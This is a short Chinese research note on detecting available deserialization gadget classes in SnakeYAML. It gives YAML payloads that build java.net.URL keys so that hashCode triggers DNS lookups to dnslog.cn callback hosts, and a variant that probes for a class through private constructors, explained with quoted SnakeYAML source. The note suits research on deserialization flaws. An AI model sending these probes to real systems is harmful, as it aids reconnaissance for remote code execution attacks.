@Y4tacker
SnakeYAML实现Gadget探测
思路来源
今天在学习SnakeYAML的反序列化的时候，想到⼀个新的探测payload，⽹上之前有⼀个SPI
那个链⼦可以有通过URLClassloader检测 
 这个的话主要是因为SnakeYAML在解析带键值对的集合的时候会对键调⽤hashCode⽅法因此
会触发DNS解析，
因此通过构造URL对象后⾯简单加个: 1让他成为⼀个mapping ，不过会触发多次
String poc = "!!java.net.URL [null, \"[http://osrwbf.dnslog.cn]
(http://osrwbf.dnslog.cn/)\"]: 1";
实现探测Gadget
不完美的构造
这⾥再补充个探测gadget思路：：在刚刚的思路上实现了探测gadget，如果string存在才会接着
触发URLDNS，不存在就不会 
当然上⾯的payload又遇到了问题，如果对象的构造⽅法私有化就不⾏，为什么呢看下⽂
更完善的⽅案
解决⽅案是
String poc = "key: [!!java.lang.String []: 0, !!java.net.URL [null, \"
[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\"]: 1]";
String poc = "key: [!!java.lang.String {}: 0, !!java.net.URL [null, \"
[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\"]: 1]";
这个与上⾯的区别不⼀样在于探测的类后⾯[]或{}对应的分别是ConstructSequence与
ConstructMapping，光这样说还是不够清楚，就详细来说，可以看
到 org.yaml.snakeyaml.constructor.Constructor.ConstructSequence#construc
t 的处理逻辑如下，我们只看最关键的地⽅
可以看到这⾥获取构造函数调⽤的是 node.getType().getConstructors() ，也就是只会
获得公有的构造函数，因此会出错
如果换成了 {} 则会调
⽤ org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#construct
这⾥⾸先调⽤ createEmptyJavaBean 实例化对象，可以看到这⾥是getDeclaredConstructor就
算是私有也Ok
那么你会好奇如果我想要调⽤带参数的构造函数怎么办，那肯定不⾏，那SnakeYAML如何处
理的呢也就是后⾯调⽤了， constructJavaBean2ndStep ，与本⽂探测问题⽆关，简单来
说其实就是在while循环⾥不断通过反射设置值
总结
有时候细节也确实很重要，昨晚匆匆忙忙却忽略了很多细节，说起来也是惭愧
protected Object createEmptyJavaBean(MappingNode node) {
  try {
    java.lang.reflect.Constructor c = 
node.getType().getDeclaredConstructor();
    c.setAccessible(true);
    return c.newInstance();
  } catch (Exception var3) {
    throw new YAMLException(var3);
  }
}